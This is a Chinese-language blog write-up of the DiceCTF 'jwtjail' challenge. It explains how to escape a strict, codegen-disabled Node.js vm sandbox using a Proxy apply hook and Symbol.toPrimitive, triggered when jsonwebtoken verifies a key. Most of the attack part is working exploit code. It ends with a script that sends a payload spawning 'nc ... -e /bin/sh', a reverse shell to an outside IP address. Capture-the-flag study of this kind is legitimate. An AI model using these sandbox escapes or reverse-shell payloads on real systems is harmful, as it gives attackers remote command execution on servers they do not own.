jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123; <span class="attr">codeGeneration</span>: &#123; <span class="attr">strings</span>: <span class="literal">false</span>, <span class="attr">wasm</span>: <span class="literal">false</span> &#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">unserialize</span> = (<span class="params">data</span>) =&gt; <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`&quot;use strict&quot;; (<span class="subst">$&#123;data&#125;</span>)`</span>).<span class="title function_">runInContext</span>(vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), ctx), &#123; <span class="attr">timeout</span>: <span class="number">250</span> &#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="property">mainModule</span> = <span class="literal">null</span>; <span class="comment">// 🙃</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;public&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/verify&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token, secretOrPrivateKey &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        token = <span class="title function_">unserialize</span>(token);</span><br><span class="line">        secretOrPrivateKey = <span class="title function_">unserialize</span>(secretOrPrivateKey);</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">success</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">data</span>: jwt.<span class="title function_">verify</span>(token, secretOrPrivateKey)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">success</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Verification failed&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`web/jwtjail listening on port <span class="subst">$&#123;PORT&#125;</span>`</span>));</span><br></pre></td></tr></table></figure>
<p>代码很容易看得懂,咱们可控的代码被放在了vm沙盒对象中，这个App是一个用来校验jwt是否正确的工具<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680357231264-e2060fbc-df7b-46b7-b95f-eef14a0f2ef2.png#averageHue=%23f5f5f5&clientId=u5f856ac0-35f4-4&from=paste&height=874&id=u6c112e09&name=image.png&originHeight=1093&originWidth=2259&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58668&status=done&style=none&taskId=u42983813-8c66-4d58-9526-9b729e33176&title=&width=1807.2" alt="image.png"></p>
<h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><p>我们输入需要校验的JWT也就是Token,然后下面放上key，他就会显示出结果，类似jwt.io功能，然后注意一下沙盒中一些选项</p>
<ul>
<li><strong>Strings:false</strong></li>
<li><strong>use strict</strong></li>
<li><strong>process.mainModule &#x3D; null;</strong></li>
</ul>
<p>这三点对应这三题的三道坎儿，首先是Strings：false，在Vm模块中可以设置选项<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680358158679-c02dcd08-b08f-43a4-9985-051312574e96.png#averageHue=%23f2f2f1&clientId=u5f856ac0-35f4-4&from=paste&height=144&id=udb3f13ee&name=image.png&originHeight=180&originWidth=1539&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55573&status=done&style=none&taskId=u4aaeaa87-faea-49bd-b146-7406a7dc7f1&title=&width=1231.2" alt="image.png"><br>设置为false说明不可以对任何eval或者是Function构造函数进行调用，假如不禁用这个选项的话那么就是一个简单的vm逃逸了，我们可以通过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure>
<p>通过this进行简单的逃逸<br>这里面的this指向的是当前传递给runInNewContext的对象，最终会返回沙盒外的对象，假如启用了之后会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680358277895-82e4073d-f067-4fd0-9799-a99a0c9e1ca3.png#averageHue=%231f201f&clientId=u5f856ac0-35f4-4&from=paste&height=65&id=u28c42672&name=image.png&originHeight=81&originWidth=622&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71296&status=done&style=none&taskId=u54441f7e-1e99-4414-9c3a-a62432070ef&title=&width=497.6" alt="image.png"><br>Code generation from strings 错误，这就是一开始在文档中看到的内容<br>还有一点就是use strict,这个选项是启用严格模式，这个选项假如没开启我们可以怎么逃逸呢？我们可以通过方法的参数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure>
<p>如上例子，我们可以通过<code>arguments</code>关键字进行逃逸，这个内置属性在学nodejs的时候见过，可以自行检索；arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。但是这里也ban掉了<br>最后一点就是process.mainModule，这个是在最后命令执行时又多了一层过滤，我们一般执行命令都是通过<code>process.mainMoudle.require(&#39;child_process&#39;)</code>进行命令执行的，但是这里直接在沙盒外又设置为了null，那么就不能通过child_process了，这里作者提到了使用spawn进行命令执行，这个在做rce的题也是遇到过<br><code>process.binding(&quot;spawn_sync&quot;).spawn(&#123;&quot;args&quot;:[&quot;nc&quot;,&quot;IP&quot;,&quot;12345&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;],&quot;file&quot;:&quot;nc&quot;,&quot;stdio&quot;:[&#123;&quot;type&quot;:&quot;pipe&quot;,&quot;readable&quot;:true,&quot;writable&quot;:false&#125;]&#125;)</code><br>使用process.binding也是可以命令执行的，那么思路理完了就该思考如何获取沙盒外的对象呢？</p>
<h2 id="Proxy-Hook"><a href="#Proxy-Hook" class="headerlink" title="Proxy Hook"></a>Proxy Hook</h2><p>什么是Proxy Hook呢？我们可以理解为php里的魔术方法，当在某种特定条件时就会触发<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680358778812-75b5341f-ad18-473c-87b0-397520edacea.png#averageHue=%23fcfbfa&clientId=u5f856ac0-35f4-4&from=paste&height=706&id=u3fcc9655&name=image.png&originHeight=883&originWidth=917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61346&status=done&style=none&taskId=u7644fa0a-9a85-488c-b72a-6b8ec633cdf&title=&width=733.6" alt="image.png"><br>其中我们常用的不亚于<code>get、set、apply</code>，但是get和set在这题由于是strict模式，我们无法获取一个沙盒外的对象，那么答案是什么呢？<br>最终答案是apply的第三个参数！</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p=<span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="function"><span class="params">_</span>=&gt;</span>_,&#123;</span><br><span class="line">    <span class="title function_">apply</span>(<span class="params">target,thisArg,argumentsList</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;come in&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(target);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(thisArg);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(argumentsList);&#125;</span><br><span class="line">&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680359249827-e9c8de1c-c8ce-4b3f-bcbb-a7f67db4bfe4.png#averageHue=%23fefefd&clientId=u5f856ac0-35f4-4&from=paste&height=230&id=uc85ebef1&name=image.png&originHeight=288&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19437&status=done&style=none&taskId=u6f0d3607-1182-4efd-934a-1e579ff3a81&title=&width=583.2" alt="image.png"><br>可以看到第三个参数返回的是一个数组类型，而数组类型在js中，这里有一个关于vm逃逸的知识，在vm模块中变量分为两种类型<strong>原生、引用</strong>，那么基本类型数字，字符串就是原生类型，而数组就是一个引用类型，这个引用类型是对象外的对象！</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">arr</span>:[<span class="number">1</span>]&#125;;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">res1=vm.<span class="title function_">runInContext</span>(<span class="string">`arr.constructor.constructor(&quot;return process&quot;)();`</span>, sandbox);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680360145916-07b56d38-d5ef-4f12-821e-b6423f19ed5d.png#averageHue=%23212421&clientId=u5f856ac0-35f4-4&from=paste&height=346&id=u87c1c8e6&name=image.png&originHeight=433&originWidth=961&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=591007&status=done&style=none&taskId=ua942750c-2163-4799-be26-1c1f7501fc6&title=&width=768.8" alt="image.png"><br>加入我们把数组换成字符串，则会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680360171295-94d56f78-72c4-44f1-8a61-15fb1116e4a4.png#averageHue=%23262724&clientId=u5f856ac0-35f4-4&from=paste&height=1090&id=uca0c62a0&name=image.png&originHeight=1363&originWidth=2306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3878239&status=done&style=none&taskId=udf83ed38-c8ab-48c7-b623-cf98e7d1dc7&title=&width=1844.8" alt="image.png"><br>现在我们已经有了一个沙盒外的对象了，我们该如何触发它呢？</p>
<h2 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="[Symbol.toPrimitive]"></a>[Symbol.toPrimitive]</h2><blockquote>
<p>对象的Symbol.toPrimitive属性，指向一个方法。该对象被转为原始类型(number、string、Boolean、null、undefined、symbol、bigInt)的值时，会调用这个方法，返回该对象对应的原始类型值。<br>Symbol.toPrimitive被调用时，会接受一个字符串参数，表示当前运算的模式，一共有三种模式。</p>
<p>Number：该场合需要转成数值<br>String：该场合需要转成字符串<br>Default：该场合可以转成数值，也可以转成字符串</p>
</blockquote>
<p>对象的symbol.toPrimitive属性你也可以当成一个hook，他会在类型强制转换时触发，下面有一个网上的例子就简单的拿过来看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680360382110-7e647489-4aec-4ec1-aa3a-faf786cd1516.png#averageHue=%23e1cdac&clientId=u5f856ac0-35f4-4&from=paste&height=462&id=uaa4a4237&name=image.png&originHeight=578&originWidth=1219&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60659&status=done&style=none&taskId=u91dc2487-f6f0-4082-a594-dcda429f386&title=&width=975.2" alt="image.png"><br>那我们结合上面所说的一系列，我们可以构造一个payload雏形</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> script=</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">constructor</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: &#123;</span><br><span class="line">            [<span class="title class_">Symbol</span>.<span class="property">toPrimitive</span>]: <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="function"><span class="params">_</span>=&gt;</span>_, &#123;</span><br><span class="line">                <span class="title function_">apply</span>(<span class="params">a,b,c</span>) &#123;</span><br><span class="line">                   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>,a);</span><br><span class="line">                   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b&quot;</span>,b);</span><br><span class="line">                   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;c&quot;</span>,c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">String</span>(script.<span class="property">constructor</span>.<span class="property">name</span>)</span><br><span class="line"><span class="title class_">Number</span>(script.<span class="property">constructor</span>.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+script.<span class="property">constructor</span>.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-script.<span class="property">constructor</span>.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`test<span class="subst">$&#123;script.constructor.name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680361322054-01fd6fee-8546-4096-ad31-741589db6264.png#averageHue=%23212421&clientId=u5f856ac0-35f4-4&from=paste&height=395&id=u46239362&name=image.png&originHeight=494&originWidth=1554&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1060544&status=done&style=none&taskId=ua3386725-cd9a-4cb3-94a0-f6a761b0f7f&title=&width=1243.2" alt="image.png"><br>根据上述例子可以看出来，在对name属性进行类型强制转换时会触发<code>Symbol.toPrimitive</code>设置的方法，也就是Proxy，而Proxy在被当成方法调用时就会触发apply hook，因此对结果进行了输出，至此思路已经很清晰，接下来直接给出payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> script=<span class="string">`</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    constructor: &#123;</span></span><br><span class="line"><span class="string">        name: &#123;</span></span><br><span class="line"><span class="string">            [Symbol.toPrimitive]: new Proxy(_=&gt;_, &#123;</span></span><br><span class="line"><span class="string">                apply(a,b,c) &#123;</span></span><br><span class="line"><span class="string">                   c.constructor.constructor(&quot;return this&quot;)().process.binding(&quot;spawn_sync&quot;).spawn(&#123;&quot;args&quot;:[&quot;calc&quot;],&quot;file&quot;:&quot;calc&quot;,&quot;stdio&quot;:[&#123;&quot;type&quot;:&quot;pipe&quot;,&quot;readable&quot;:true,&quot;writable&quot;:false&#125;]&#125;)</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;`</span></span><br><span class="line"><span class="comment">// Number(script.constructor.name)</span></span><br><span class="line"><span class="keyword">const</span> ctx = &#123; <span class="attr">codeGeneration</span>: &#123; <span class="attr">strings</span>: <span class="literal">false</span>, <span class="attr">wasm</span>: <span class="literal">false</span> &#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">unserialize</span> = (<span class="params">data</span>) =&gt; <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`&quot;use strict&quot;; (<span class="subst">$&#123;data&#125;</span>)`</span>).<span class="title function_">runInContext</span>(vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), ctx), &#123; <span class="attr">timeout</span>: <span class="number">250</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> token=<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.LLPW3b1BzsGRHh1AiHDi6W6RKK-k7INCN_gkvzJUlfo&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> p=<span class="title function_">unserialize</span>(script);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p)</span><br><span class="line">jwt.<span class="title function_">verify</span>(token, p)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680360640632-450910e6-4d4c-4b4d-9380-dca6d7195792.png#averageHue=%232c2d27&clientId=u5f856ac0-35f4-4&from=paste&height=669&id=ue4e10db5&name=image.png&originHeight=836&originWidth=1576&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1679454&status=done&style=none&taskId=u5511e2fb-5f66-43cf-90b9-44da589f0cf&title=&width=1260.8" alt="image.png"><br>至此成功逃逸</p>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>给一个断点在verify函数，因为题目触发点就是在这里<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680361178433-8ceb2b60-af47-453a-9af8-f52bbfa8edcd.png#averageHue=%232a2c29&clientId=u5f856ac0-35f4-4&from=paste&height=728&id=uf96993a2&name=image.png&originHeight=910&originWidth=2036&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2481877&status=done&style=none&taskId=u86a405b2-b652-424d-8c43-37b054ce22a&title=&width=1628.8" alt="image.png"><br>我们payload位置对应的是key，可以看到这莉的key就是自定义的proxy类，然后由于类型不符合就会进入报错流程<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680361218384-2e12399a-9e9b-4b5a-a15f-c14bfbbf6409.png#averageHue=%23292a28&clientId=u5f856ac0-35f4-4&from=paste&height=770&id=u69288a0e&name=image.png&originHeight=963&originWidth=1814&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2573049&status=done&style=none&taskId=ube664ab8-8e20-4476-ae20-f8998f418f0&title=&width=1451.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680361235229-9e54f152-049c-4430-9275-5d055a44ad00.png#averageHue=%23292b28&clientId=u5f856ac0-35f4-4&from=paste&height=716&id=ua188e1ca&name=image.png&originHeight=895&originWidth=1482&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1805237&status=done&style=none&taskId=uf79e9a71-7d1e-4050-a757-d15b67ff44a&title=&width=1185.6" alt="image.png"><br>在这里存在一个对<code>value.constructor.name</code>的强制字符串类型转换，value也就是代理对象，那么就会触发apply hook，这个在先前的demo中证实了的，因此最后弹出计算机，流程就是如此~</p>
<h2 id="linux环境测试"><a href="#linux环境测试" class="headerlink" title="linux环境测试"></a>linux环境测试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> endpoint = <span class="string">`http://127.0.0.1:5555`</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;&#125;, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="title function_">fetch</span>(endpoint + <span class="string">`/api/verify`</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">token</span>: <span class="string">`&#x27;<span class="subst">$&#123;token&#125;</span>&#x27;`</span>,</span><br><span class="line">        <span class="comment">//secretOrPrivateKey</span></span><br><span class="line">    <span class="attr">secretOrPrivateKey</span>:<span class="string">`&#123;</span></span><br><span class="line"><span class="string">    constructor: &#123;</span></span><br><span class="line"><span class="string">        name: &#123;</span></span><br><span class="line"><span class="string">            [Symbol.toPrimitive]: new Proxy(_=&gt;_, &#123;</span></span><br><span class="line"><span class="string">                apply(a,b,c) &#123;</span></span><br><span class="line"><span class="string">                   c.constructor.constructor(&quot;return this&quot;)().process.binding(&quot;spawn_sync&quot;).spawn(&#123;&quot;args&quot;:[&quot;nc&quot;,&quot;114.116.119.253&quot;,&quot;7777&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;],&quot;file&quot;:&quot;nc&quot;,&quot;stdio&quot;:[&#123;&quot;type&quot;:&quot;pipe&quot;,&quot;readable&quot;:true,&quot;writable&quot;:false&#125;]&#125;)</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;`</span></span><br><span class="line">&#125;)&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680362332532-dfa65e31-d446-47de-af4a-9d2da03fee79.png#averageHue=%23252524&clientId=u5f856ac0-35f4-4&from=paste&height=477&id=u5eb7ce89&name=image.png&originHeight=596&originWidth=1464&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67088&status=done&style=none&taskId=u78572082-9314-4cf3-879a-3a78172dd74&title=&width=1171.2" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/DiceCTF/" class="tag">#DiceCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">我来对Hibernate利用链说一二</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/29/HxpCTF2022&amp;2021%20_%20Web/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">HxpCTF2022&amp;2021 Web</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
